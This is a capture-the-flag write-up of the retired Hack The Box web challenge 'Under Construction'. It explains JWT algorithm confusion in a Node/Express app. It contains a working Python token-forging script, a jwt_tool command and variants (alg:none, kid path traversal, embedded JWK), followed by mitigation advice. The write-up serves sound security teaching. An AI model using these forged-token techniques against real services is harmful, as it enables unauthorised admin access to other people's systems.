---
challenge: Under Construction
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, jwt, alg-confusion, rs256, hs256]
---

# Under Construction — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A Node/Express app authenticating with **RS256 JWTs**. The public key is served at `/public.pem` (and `kid` points at `/jwks.json`), and the library accepts whatever algorithm the token declares. Switch `alg` to `HS256` and sign with the public key as the HMAC secret, and the server validates the token with its own public key: forge an `admin` JWT and walk into the panel.

## Prompt

Register and log in. Successful auth redirects to `/home`, which prints `Welcome <user>`. `/admin` exists, and the challenge ships its source.

## Analysis

```js
const jwt = require('jsonwebtoken');
const publicKey = fs.readFileSync('public.pem');

app.get('/public.pem', (req, res) => res.send(publicKey));

app.post('/login', (req, res) => {
  const token = jwt.sign({ username: user.username }, privateKey, { algorithm: 'RS256' });
  res.cookie('auth', token);
});

function auth(req, res, next) {
  const decoded = jwt.verify(req.cookies.auth, publicKey);   // no fixed algorithms
  ...
}
```

The classic bug: `jwt.verify` without the `algorithms` option. If the token asks for `HS256`, the library treats `publicKey` as the HMAC *secret*. The public key is not secret, so anyone can sign.

## Exploitation

```bash
curl -s http://<IP>:<PORT>/public.pem -o public.pem
```

```python
import jwt, requests

clave = open("public.pem", "rb").read()
token = jwt.encode({"username": "admin"}, clave, algorithm="HS256")
r = requests.get("http://<IP>:<PORT>/admin", cookies={"auth": token})
print(r.text)
```

```text
HTB{<flag>}
```

With `jwt_tool` the flow is the same:

```bash
python3 jwt_tool.py <token> -X k -pk public.pem
# -X k = key confusion; also try alg=none and kid traversal
```

## Variants of the same bug

- **`alg: none`** when an old library accepts unsigned tokens and the algorithm is not pinned.
- **`kid` traversal**: `kid: ../../../../dev/null` signs with known empty content.
- **Embedded JWK**: the server trusts the `jwk` header key and you sign with your own.

## Lessons

- Verifying a JWT without pinning `algorithms` opens the door to algorithm confusion.
- The public key can **never** act as a secret: it is public by definition.
- Mitigation: `jwt.verify(token, publicKey, { algorithms: ['RS256'] })`, validate `iss`/`aud`, and never accept `kid`/`jwk` from the client.
